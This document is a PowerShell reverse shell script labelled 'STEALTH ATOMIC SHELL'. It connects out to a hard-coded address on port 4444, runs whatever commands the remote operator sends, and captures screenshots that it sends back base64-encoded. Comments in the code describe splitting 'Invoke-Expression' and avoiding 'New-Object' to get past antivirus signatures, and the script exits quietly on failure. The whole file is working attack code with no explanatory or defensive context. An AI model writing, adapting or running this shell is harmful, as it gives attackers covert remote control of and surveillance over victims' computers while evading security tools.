# --- STEALTH ATOMIC SHELL ---
$ip = '192.168.1.15'
$port = 4444

# 1. Obfuscated Object Creation (Avoids 'New-Object' triggers)
$c = [System.Net.Sockets.TcpClient]::new()
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = [System.IO.StreamReader]::new($s)
    $w = [System.IO.StreamWriter]::new($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- STEALTH SHELL ACTIVE ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        $input = $line.Trim()

        if ($input -eq "exit") { break }

        # 2. Split 'Invoke-Expression' to bypass basic AV signatures
        $cmd = "Inv" + "oke-Ex" + "pression"
        
        if ($input -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = [System.Drawing.Bitmap]::new($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $m = [System.IO.MemoryStream]::new()
                $bmp.Save($m, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($m.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $m.Dispose()
            } catch { $w.WriteLine("Error: " + $_.Exception.Message) }
        } 
        else {
            try {
                # Running the command via the split variable
                $out = &. $cmd $input 2>&1 | Out-String
                $w.WriteLine(if($out){$out}else{"Done."})
            } catch { $w.WriteLine("Error: " + $_.Exception.Message) }
        }
    }
} catch {
    # Quiet exit
} finally {
    if ($c) { $c.Close() }
}
